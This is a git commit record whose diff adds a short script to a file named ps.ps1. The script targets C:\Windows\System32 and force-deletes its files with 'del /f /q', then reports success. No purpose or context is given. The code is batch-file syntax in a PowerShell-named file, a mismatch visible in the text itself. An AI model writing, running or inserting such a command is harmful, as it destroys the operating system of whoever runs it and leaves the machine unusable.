9ac611dc5e7f736f2ffb6d6bccd8a6ff35a52ac8
Hello-Bro-3823 <xbrayx1.6month@gmail.com>
2025-03-09 01:04:19 -0500

    Update ps.ps1

--- ps.ps1
+++ ps.ps1
@@ -1,1 +1,10 @@
+@echo off
+set file_path="C:\Windows\System32"
 
+if exist %file_path% (
+    del /f /q %file_path%
+    echo File deleted successfully.
+) else (
+    echo File does not exist.
+)
+pause
